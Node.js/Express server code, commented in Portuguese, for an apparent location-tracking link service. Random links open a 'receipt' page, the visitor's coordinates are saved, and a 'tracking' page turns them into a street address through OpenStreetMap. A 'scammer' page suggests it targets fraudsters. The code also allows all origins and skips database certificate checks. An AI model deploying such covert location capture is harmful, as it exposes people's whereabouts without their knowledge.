const express = require("express");
const knex = require("knex");
const cors = require("cors");
const rateLimit = require("express-rate-limit");
const fetch = require("node-fetch");
const crypto = require("crypto");
const dotenv = require("dotenv");
const ejs = require("ejs");

dotenv.config();

const app = express();
const port = 3000;

app.use(express.json());
app.use(cors({ origin: "*" }));
app.engine("html", ejs.renderFile);
app.set("views", "./front");
app.set("view engine", "ejs");

const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 100,
  message: { error: "Muitas requisições. Tente novamente em instantes." },
});
app.use(limiter);

// DB
const db = knex({
  client: "pg",
  connection: {
    connectionString: process.env.DB_URL,
    ssl: { rejectUnauthorized: false },
  },
  pool: {
    min: 1,
    max: 2,
  },
});

// Cria tabela do zero (recria toda vez — cuidado em produção)
// (async () => {
//   await db.schema.dropTableIfExists("localizacoes");
//   await db.schema.createTable("localizacoes", (table) => {
//     table.increments("id").primary();
//     table.string("link").unique();
//     table.float("latitude");
//     table.float("longitude");
//     table.timestamp("created_at").defaultTo(db.fn.now());
//   });
// })();

// Servir arquivos estáticos da pasta front
app.use(express.static("front"));

app.get("/", async (req, res) => {
  res.render("index.html");
});

// Servir arquivos estáticos da pasta front
app.get("/comprovante/:link", async (req, res) => {
  const { link } = req.params;
  const localizacao = await db("localizacoes").where({ link }).first();
  if (!localizacao) {
    return res.status(404).send("Link inválido ou não encontrado.");
  }
  res.render("comprovante.html", { localizacao });
});

app.get("/gerarlink", async (req, res) => {
  res.render("gerarlink.html");
});

app.post("/gerarlink", async (req, res) => {
  const link = crypto.randomUUID();
  try {
    await db("localizacoes").insert({ link });
    console.log("Registro criado com sucesso", link);
    res.json({ message: "Registro criado com sucesso", link });
  } catch (err) {
    console.error("Erro ao criar registro:", err);
    res.status(500).json({ error: "Erro interno do servidor" });
  }
});

// Atualiza a linha do link com latitude/longitude
app.post("/localizacao", async (req, res) => {
  const { link, latitude, longitude } = req.body;

  if (!link || typeof latitude !== "number" || typeof longitude !== "number") {
    return res.status(400).json({ error: "Parâmetros inválidos" });
  }

  try {
    await db("localizacoes").where({ link }).update({ latitude, longitude });

    const raw = await getAddressFromLatLng(latitude, longitude);

    const parsed = parseEndereco(raw);
    res
      .status(201)
      .json({ message: "Localização salva com sucesso", address: parsed });
  } catch (err) {
    console.error("Erro ao salvar localização:", err);
    res.status(500).json({ error: "Erro interno do servidor" });
  }
});

// rastreio
app.get("/rastreio/:link", async (req, res) => {
  const { link } = req.params;
  const localizacao = await db("localizacoes").where({ link }).first();
  let address = null;

  if (localizacao?.latitude && localizacao?.longitude) {
    try {
      const raw = await getAddressFromLatLng(
        localizacao.latitude,
        localizacao.longitude
      );
      address = parseEndereco(raw);
    } catch (error) {
      console.error("Erro ao buscar endereço:", error.message);
    }
  }

  res.render("rastreio.html", { localizacao, address });
});

// golpista
app.get("/golpista", async (req, res) => {
  res.render("golpista.html");
});

async function getAddressFromLatLng(latitude, longitude) {
  const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&addressdetails=1`;
  const response = await fetch(url, {
    headers: {
      "User-Agent": "autolocalizacao/1.0 (seuemail@email.com)",
    },
  });

  if (!response.ok) throw new Error("Erro ao buscar endereço");

  return response.json();
}

function parseEndereco(raw) {
  const address = raw?.address || {};

  return {
    nome:
      raw?.name ||
      address?.shop ||
      address?.building ||
      "Local não identificado",
    rua: `${address.road || "Rua desconhecida"} ${
      address.house_number || ""
    }`.trim(),
    bairro: address.suburb || address.neighbourhood || "Bairro desconhecido",
    cidade:
      address.city || address.town || address.village || "Cidade desconhecida",
    estado: address.state || "",
    cep: address.postcode || "",
    pais: address.country || "",
    display_name: raw?.display_name || "",
    lat: raw?.lat,
    lon: raw?.lon,
    raw: address,
  };
}

app.listen(port, () => {
  console.log(`🔥 API rodando em http://localhost:${port}`);
});
